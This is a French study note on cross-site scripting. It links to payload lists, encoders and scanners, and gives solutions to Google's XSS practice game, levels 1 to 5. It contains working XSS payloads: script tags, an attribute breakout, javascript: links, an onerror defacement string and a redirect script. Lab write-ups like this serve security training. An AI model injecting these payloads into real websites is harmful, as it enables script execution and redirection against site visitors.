https://xss-game.appspot.com

## https://github.com/payloadbox/xss-payload-list$















https://resources.infosecinstitute.com/topic/deadly-consequences-xss/

 <img src=""onerror="alert('hacked by pti-seb')"a=".jpg" />';



## Encoder 

XSS encoder : http://evuln.com/tools/xss-encoder/

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

## Ressources utiles :

### Outils

`https://github.com/payloadbox/xss-payload-list`

`Encodage url : http://evuln.com/tools/xss-encoder/`

`Scanner url : http://xss-scanner.com`

Outils :

**`git clone https://github.com/faizann24/XssPy/` /opt/xsspy**

python XssPy.py website.com

https://kalilinuxtutorials.com/xsspy-web-application/

## Cheattsheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### Tutoriels

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting



## Playload

```
<script>
   window.location="http://www.site_dangereux_et_compromettant.com";
</script>
```

# Google

Il y a quelques années Google a mis en ligne un site, [https://xss-game.appspot.com](https://xss-game.appspot.com) permettant de s'entraîner aux vulnérabilités XSS. Celui-contient 6 challenges

Ce document résume les solutions possibles pour chaque challenge.



### Niveau 1 - Reflected

Dans ce niveau, on a un formulaire html pour effectuer une recherche. Le mot recherché sera ensuite affiché par une nouvelle page, comme ci-dessus pour l'input `test`

![xss-1-search](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\xss-1-search.PNG)

**Solution**

Les caractères ne sont pas échappés. On peut alors générer une alerte XSS en utilisant les balises `script` pour contenir le code malvaillants.

```javascript
<script>alert("Hello")</script>
```



### Niveau 2 - XSS persistence

Dans celui-ci on a affaire à une `stored xss`. L'utilisateur peut poster un message et c'est dans celui-ci que l'on va pouvoir mettre notre script malveillants.

![2-forms-input](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\2-forms-input.PNG)

**Solution**

Pour fairee simple, j'ai mis le XSS  sous la forme de lien à cliquer mais on pourrait imaginer utiliser des images, des balises iframes, ainsi que diriger automatiquement l'utilisateur sans passer par un clique.

```html
<a href="javascript:alert()">Lien</a>
```



### Niveau 3 - url

Dans ce challenge, le site web affiche des images que l'on peut sélectionner

![3-image](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\3-image.PNG)

**Solution**

En regardant l'url après avoir cliqué une image, on peut voir que le site web affiche l'image spécifié par la valeur du fragment. Avec l'url suivante : https://xss-game.appspot.com/level3/frame#2, c'est l'image cloud2 qui sera affichée.

On regardant le code code source, on peut voir le code suivant :

![xss-level3-2](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\xss-level3-2.PNG)



L'objectif va être d'escapper l'url afin d'y ajouter une balise script après l'attribut `src` de la balise `img`

```
'><script>alert("HEllo")</script>
```

![xss-chap3](../../assets_2/web/xss/xss-chap3.PNG)





### Niveau 4

Au niveau 4 nous avons un timer

![4-timer-input](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\4-timer-input.PNG)

![xss-level4-timer](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\xss-level4-timer.PNG)

**Solution**

En regardant le code plus attentivement, on peut voir qu'une fonction startTimer est appelées

![4-timer](C:\Users\super\switchdrive2\HEIG\divers\mywebsite\assets_2\web\xss\4-timer.PNG)



L'attaque va se consacrer sur la partie

```javascript
seconds = parseInt(seconds) || 3
```

Vu que seconds est la valeur de notre input, on peut faire en sorte d'exécuter `parseInt` puis ensuite une `alert` en ajoutant un guillemet simple, une paranthèse et un point-virgule.

Le payload est le suivant :

`3');alert('test`

### Niveau 5 - DOM

Le code suivant ne fonctionne pas

```html
<script>alert('hello')</script>
```

## 

Ressources utiles : https://sagarvd01.medium.com/learning-xss-with-googles-xss-game-f44ff8ee3d8b

On observant signup.html, on constate que la valeur url du lien dépend de l'attribut next

```html
<a href="{{ next }}">Next >></a>
```

On peut par conséquent modifier la valeur du lien

Pour ce challenge, on utilise la fonctionnalité bookmarklet des navigateurs web. Celles-ci permet d'indiquer dans un pyherlien ou une url du code javascript qui sera exécuter par le navigateur. Son url commence par `javascript:`

Source : https://fr.wikipedia.org/wiki/Bookmarklet

Article intéressant sur le sujet : https://medium.com/making-instapaper/bookmarklets-are-dead-d470d4bbb626

href="/level5/frame/signup?next=javascript:alert('Hello')"

# DVWA